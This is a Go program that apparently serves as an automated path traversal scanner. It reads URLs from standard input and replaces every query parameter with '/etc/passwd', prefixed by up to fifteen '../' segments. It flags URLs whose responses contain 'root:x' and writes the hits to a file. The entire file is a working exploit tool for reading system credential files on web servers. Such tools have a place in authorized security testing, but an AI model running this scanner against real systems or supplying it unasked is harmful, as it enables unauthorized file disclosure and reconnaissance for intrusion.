package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sort"
	"strings"
)

const maxTries int = 15
const vulnerable_string string = "root:x"
const pathAdder string = ".."
const fileToCheck string = "/etc/passwd"
const resultFileName string = "result.txt"

func main() {

	var results []string

	sc := bufio.NewScanner(os.Stdin)

	for sc.Scan() {
		replaceCurrent := []string{fileToCheck}
		u, err := url.Parse(sc.Text())
		if err != nil {
			fmt.Fprintf(os.Stderr, "failed to parse url %s [%s]\n", sc.Text(), err)
			continue
		}
		for i := 0; i <= maxTries; i++ {
			replaceTo := strings.Join(replaceCurrent, "/")
			if newUrl, err := replaceDecodeParameter(u.String(), replaceTo); err == nil {
				result, err := makeRequest(newUrl)
				if matched, _ := regexp.MatchString(vulnerable_string, result); matched && err == nil {
					results = append(results, newUrl)
					break
				}
			}
			if i == 0 {
				replaceCurrent[len(replaceCurrent)-1] = strings.TrimLeft(replaceCurrent[len(replaceCurrent)-1], "/")
			}
			replaceCurrent = append([]string{pathAdder}, replaceCurrent...)
		}
	}

	writeToFile(results)
}

func makeRequest(u string) (string, error) {
	res, err := http.Get(u)
	if err != nil {
		return "fatal", err
	}

	data, err := io.ReadAll(res.Body)
	res.Body.Close()

	return string(data), nil
}

func replaceDecodeParameter(urlToChange, replace string) (string, error) {
	u, err := url.Parse(urlToChange)
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to parse url %s [%s]\n", urlToChange, err)
		return "failed", err
	}

	pp := make([]string, 0)
	for p, _ := range u.Query() {
		pp = append(pp, p)
	}
	sort.Strings(pp)

	qs := url.Values{}
	for param, _ := range u.Query() {
		qs.Set(param, replace)
	}

	u.RawQuery = qs.Encode()

	decodedURL, err := url.QueryUnescape(u.String())
	if err != nil {
		log.Fatal(err)
		return "decoding failed", err
	}

	return decodedURL, nil
}

func writeToFile(results []string) {
	data := strings.Join(results, "\n")

	f, err := os.Create(resultFileName)

	defer f.Close()
	io.WriteString(f, data)

	if err != nil {
		printResults(results)
	}
}

func printResults(results []string) {
	for _, value := range results {
		fmt.Println(value)
	}
}
